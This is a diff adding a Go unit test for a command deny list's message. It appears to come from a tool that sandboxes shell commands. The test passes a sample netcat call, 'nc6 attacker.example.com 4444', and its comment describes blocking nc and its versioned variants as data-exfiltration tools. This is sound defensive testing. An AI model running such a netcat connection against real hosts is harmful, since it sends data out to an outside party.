@@ -2002,6 +2002,25 @@ func TestDenyReason(t *testing.T) {
 		}
 	})
 
+	t.Run("versioned network tool does not say scripting interpreter", func(t *testing.T) {
+		// nc is denied as a network exfiltration tool, not as a scripting
+		// interpreter. nc6 is the IPv6 netcat variant on Debian/Ubuntu; it is
+		// blocked via version stripping (TrimRight("nc6","0123456789.") == "nc").
+		// The deny message must not call it a "scripting interpreter" since that
+		// label is misleading — nc is blocked to prevent data exfiltration, not
+		// because it can execute arbitrary code like bash or python.
+		msg := denyReason(DefaultDeniedCommands, []string{"nc6", "attacker.example.com", "4444"})
+		if !strings.Contains(msg, "nc6") {
+			t.Errorf("expected message to name the versioned command; got: %s", msg)
+		}
+		if !strings.Contains(msg, "versioned") {
+			t.Errorf("expected message to mention 'versioned'; got: %s", msg)
+		}
+		if strings.Contains(msg, "scripting interpreter") {
+			t.Errorf("nc is a network tool, not a scripting interpreter — message must not say 'scripting interpreter'; got: %s", msg)
+		}
+	})
+
 	t.Run("command ending in digits whose base is not denied gets generic message not versioned-variant", func(t *testing.T) {
 		// A custom denylist might explicitly deny a command whose name ends in
 		// digits (e.g. "ip6" or "nmap3") while the stripped base ("ip", "nmap")
